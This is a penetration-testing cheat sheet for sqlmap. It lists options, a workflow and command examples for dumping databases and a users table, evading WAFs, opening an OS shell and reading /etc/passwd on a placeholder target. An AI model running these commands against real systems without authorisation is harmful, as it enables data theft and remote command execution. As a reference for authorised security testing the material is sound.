# SQLMap Essentials

Powerful automated detection and exploitation of SQL injection.

## Basic
```bash
sqlmap -u "http://target/vuln.php?id=1" --batch
sqlmap -u "..." --dbs
```

## Key Options

| Option | Description |
|--------|-------------|
| `-u URL` | Target URL |
| `-r req.txt` | Load full request from file (best for complex/POST/headers) |
| `--data` | POST data |
| `-p param` | Test specific param |
| `--cookie=...` | Supply session cookie |
| `--level=1..5` `--risk=1..3` | Test depth and aggressiveness |
| `--technique=BEUSTQ` | Choose techniques (B=boolean, E=error, U=union, S=stacked, T=time, Q=inline) |
| `--dbms=mysql` | Force DBMS |
| `--tamper=between,randomcase` | WAF evasion |
| `--os-shell` / `--os-cmd` | Attempt command exec |
| `--dump` `-D db -T table` | Extract data |
| `--batch` | Never ask |
| `-v 3` | Verbose |

## Common Workflow
1. Confirm manually.
2. `sqlmap -u "..." -p id --batch --dbs`
3. Drill down to interesting DB/table.
4. Dump selective columns.
5. If stacked queries / file privs → `--os-shell`.

## 2026 Practical

- For modern apps/APIs: save request in Burp (right click → Copy to file) then `-r`.
- JSON bodies: use `--data` with proper Content-Type or tamper.
- Use with `--proxy` to see traffic in Burp.
- Be careful on production — can be noisy / destructive.

References: sqlmap official, PayloadsAllTheThings.

## More Concrete sqlmap Examples

```bash
# Basic GET with output
sqlmap -u "http://target/page?id=1" --dbs --batch --output-dir=/tmp/sqlmap

# POST from Burp request file (best practice)
sqlmap -r login.req --batch -p username --dbs

# Dump specific table with where condition
sqlmap -u "http://target/view?id=5" -D appdb -T users --dump --where="id=1"

# OS shell + file read
sqlmap -u "http://target/vuln?id=1" --os-shell --file-read=/etc/passwd

# API JSON injection
sqlmap -u "https://target/api/search" --data '{"id":1}' \
  -H "Content-Type: application/json" --batch --technique=BT

# WAF bypass + specific DBMS
sqlmap -u "http://target/search?q=test" --tamper=between,randomcase \
  --dbms=mysql --risk=3 --level=5 --technique=EU
```
